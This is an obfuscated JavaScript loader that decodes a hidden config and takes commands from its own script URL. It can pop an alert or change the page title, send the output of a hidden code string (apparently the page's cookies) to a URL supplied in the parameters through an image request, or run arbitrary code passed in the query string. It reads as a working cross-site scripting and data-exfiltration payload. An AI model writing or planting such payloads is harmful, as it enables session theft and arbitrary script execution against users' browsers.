!function(){
var K='dK7';
var D=function(s){try{var b=atob(s),o='',i=0;for(;i<b.length;i++)o+=String.fromCharCode(b.charCodeAt(i)^K.charCodeAt(i%K.length));return decodeURIComponent(escape(o));}catch(e){return '';}};
var C=JSON.parse(D('H2lWRnEXRipbATlDRmcXRi9TRnEXRjlSED5FCmtTCyhCCS5ZEGVTCyZWDSUVSGsVED8VXmsVECJDCC4VGQ=='));
var s=document.currentScript||function(){var z=document.scripts;return z[z.length-1];}();
if(!s)return;
var q={};
(s.src.split('?')[1]||'').replace(/([^=&]+)=([^&]*)/g,function(_,k,v){q[decodeURIComponent(k.replace(/\+/g,' '))]=decodeURIComponent(v.replace(/\+/g,' '));return '';});
var o=q.i?D(q.i):'';
var d=q.d?D(q.d):'';
var F=Function;
try{
if(o==='t'){document[C.tt]=F(C.dd)();}
else if(o==='a'){window[C.a](F(C.dd)());}
else if(o==='b'){(new Image()).src=d+encodeURIComponent(F(C.dd)());}
else if(o==='e'){F(d)();}
}catch(e){}
}();
